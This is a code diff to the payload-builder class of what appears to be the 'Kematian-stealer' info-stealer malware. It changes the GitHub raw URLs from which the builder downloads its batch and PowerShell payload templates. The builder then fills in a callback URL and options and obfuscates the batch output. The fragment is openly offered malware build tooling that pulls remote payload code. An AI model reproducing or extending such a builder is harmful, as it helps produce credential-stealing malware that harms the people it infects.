@@ -94,7 +94,7 @@ class BuildPayload:
         return content
 
     async def build_bat(self, url: str, name: str, options: dict[str, bool]) -> None:
-        github_raw_url_bat = "https://raw.githubusercontent.com/Pirate-Devs/Kematian/main/frontend-src/main.bat"
+        github_raw_url_bat = "https://raw.githubusercontent.com/0x559/Kematian-stealer/main/frontend-src/main.bat"
         # content = requests.get(github_raw_url_bat).text.strip()
 
         async with aiohttp.ClientSession() as session:
@@ -134,7 +134,7 @@ class BuildPayload:
             os.rename(f"{working_dir}\\{name}_obf.bat", f"{working_dir}\\{name}.bat")
 
     async def build_ps1(self, url: str, name: str, options: dict[str, bool]) -> None:
-        github_raw_url_ps1 = "https://raw.githubusercontent.com/Pirate-Devs/Kematian/main/frontend-src/main.ps1"
+        github_raw_url_ps1 = "https://raw.githubusercontent.com/0x559/Kematian-stealer/main/frontend-src/main.ps1"
         content = requests.get(github_raw_url_ps1).text.strip()
 
         content = await self._replace(content, options, url, hashtags=True)
